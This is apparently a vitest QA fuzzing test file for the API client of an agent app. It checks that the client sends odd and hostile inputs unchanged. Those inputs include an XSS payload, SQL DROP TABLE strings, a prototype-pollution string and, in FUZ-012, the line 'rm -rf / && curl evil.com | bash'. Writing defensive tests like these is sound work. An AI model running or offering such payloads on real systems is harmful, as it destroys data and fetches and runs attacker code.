import { describe, expect, it, vi, beforeEach, afterEach } from "vitest";

import { MiladyClient, ApiError } from "../api/client";

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function jsonResponse(body: unknown, status = 200): Response {
  return new Response(JSON.stringify(body), {
    status,
    headers: { "Content-Type": "application/json" },
  });
}

function errorJsonResponse(status: number, error: string): Response {
  return new Response(JSON.stringify({ error }), {
    status,
    headers: { "Content-Type": "application/json" },
  });
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

describe("QA: Input Fuzzing", () => {
  let client: MiladyClient;
  let mockFetch: ReturnType<typeof vi.fn>;

  beforeEach(() => {
    mockFetch = vi.fn();
    vi.stubGlobal("fetch", mockFetch);
    client = new MiladyClient("http://localhost:31337");
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  it("FUZ-001: empty string chat message sends to server", async () => {
    mockFetch.mockResolvedValue(
      jsonResponse({ text: "", agentName: "milady" }),
    );

    const result = await client.sendChatRest("");
    expect(mockFetch).toHaveBeenCalledOnce();

    const body = JSON.parse(
      (mockFetch.mock.calls[0] as [string, RequestInit])[1].body as string,
    );
    expect(body.text).toBe("");
    expect(result).toHaveProperty("text");
  });

  it("FUZ-002: whitespace-only message sends to server", async () => {
    mockFetch.mockResolvedValue(
      jsonResponse({ text: "", agentName: "milady" }),
    );

    await client.sendChatRest("   \t\n  ");
    expect(mockFetch).toHaveBeenCalledOnce();

    const body = JSON.parse(
      (mockFetch.mock.calls[0] as [string, RequestInit])[1].body as string,
    );
    expect(body.text).toBe("   \t\n  ");
  });

  it("FUZ-003: 100K character message does not throw OOM", async () => {
    const longMessage = "A".repeat(100_000);
    mockFetch.mockResolvedValue(
      jsonResponse({ text: "ok", agentName: "milady" }),
    );

    await expect(client.sendChatRest(longMessage)).resolves.toBeDefined();
    expect(mockFetch).toHaveBeenCalledOnce();

    const body = JSON.parse(
      (mockFetch.mock.calls[0] as [string, RequestInit])[1].body as string,
    );
    expect(body.text).toHaveLength(100_000);
  });

  it("FUZ-004: unicode/emoji heavy message sends correctly", async () => {
    const emojiMessage = "Hello 🌍🔥💀 日本語 العربية 中文 𝕳𝖊𝖑𝖑𝖔";
    mockFetch.mockResolvedValue(
      jsonResponse({ text: "ok", agentName: "milady" }),
    );

    await client.sendChatRest(emojiMessage);
    expect(mockFetch).toHaveBeenCalledOnce();

    const body = JSON.parse(
      (mockFetch.mock.calls[0] as [string, RequestInit])[1].body as string,
    );
    expect(body.text).toBe(emojiMessage);
  });

  it("FUZ-005: XSS payload is preserved as-is in message", async () => {
    const xss = '<script>alert(1)</script><img onerror="alert(2)" src=x>';
    mockFetch.mockResolvedValue(
      jsonResponse({ text: "ok", agentName: "milady" }),
    );

    await client.sendChatRest(xss);

    const body = JSON.parse(
      (mockFetch.mock.calls[0] as [string, RequestInit])[1].body as string,
    );
    expect(body.text).toBe(xss);
  });

  it("FUZ-008: SQL injection in config value is sent to server", async () => {
    const sqlPayload = { key: "'; DROP TABLE users; --" };
    mockFetch.mockResolvedValue(jsonResponse({ ok: true }));

    await client.updateConfig(sqlPayload);
    expect(mockFetch).toHaveBeenCalledOnce();

    const body = JSON.parse(
      (mockFetch.mock.calls[0] as [string, RequestInit])[1].body as string,
    );
    expect(body.key).toBe("'; DROP TABLE users; --");
  });

  it("FUZ-009: prototype pollution via JSON.parse is prevented", () => {
    const malicious = '{"__proto__": {"admin": true}}';
    const parsed = JSON.parse(malicious);
    expect(({} as any).admin).toBeUndefined();
    // The parsed object itself has the key but it does not pollute the prototype
    expect(parsed.__proto__).toEqual({ admin: true });
  });

  it("FUZ-011: SQL via executeDatabaseQuery is sent to server for validation", async () => {
    const dangerousQuery = "DROP TABLE users; DELETE FROM sessions;";
    mockFetch.mockResolvedValue(
      jsonResponse({ columns: [], rows: [], rowCount: 0, durationMs: 1 }),
    );

    await client.executeDatabaseQuery(dangerousQuery, false);
    expect(mockFetch).toHaveBeenCalledOnce();

    const body = JSON.parse(
      (mockFetch.mock.calls[0] as [string, RequestInit])[1].body as string,
    );
    expect(body.sql).toBe(dangerousQuery);
  });

  it("FUZ-012: command injection via runTerminalCommand is sent as-is", async () => {
    const cmd = "rm -rf / && curl evil.com | bash";
    mockFetch.mockResolvedValue(jsonResponse({ ok: true }));

    await client.runTerminalCommand(cmd);
    expect(mockFetch).toHaveBeenCalledOnce();

    const body = JSON.parse(
      (mockFetch.mock.calls[0] as [string, RequestInit])[1].body as string,
    );
    expect(body.command).toBe(cmd);
  });

  it("FUZ-014: invalid JSON body from server throws ApiError", async () => {
    mockFetch.mockResolvedValue(
      new Response("this is not json {{{", {
        status: 200,
        headers: { "Content-Type": "application/json" },
      }),
    );

    // The client calls res.json() which will throw on invalid JSON.
    // This should propagate as an error.
    await expect(client.sendChatRest("hello")).rejects.toThrow();
  });

  it("FUZ-023: file type validation — client sends file regardless", async () => {
    // updateConfig with a file-related config is sent as-is
    const payload = { avatarFile: "malicious.exe", fileType: ".exe" };
    mockFetch.mockResolvedValue(jsonResponse({ ok: true }));

    await client.updateConfig(payload);
    expect(mockFetch).toHaveBeenCalledOnce();

    const body = JSON.parse(
      (mockFetch.mock.calls[0] as [string, RequestInit])[1].body as string,
    );
    expect(body.avatarFile).toBe("malicious.exe");
    expect(body.fileType).toBe(".exe");
  });

  it("FUZ-024: zero-byte content sends to server", async () => {
    mockFetch.mockResolvedValue(
      jsonResponse({ text: "", agentName: "milady" }),
    );

    const result = await client.sendChatRest("");
    expect(result).toBeDefined();
    expect(mockFetch).toHaveBeenCalledOnce();
  });
});
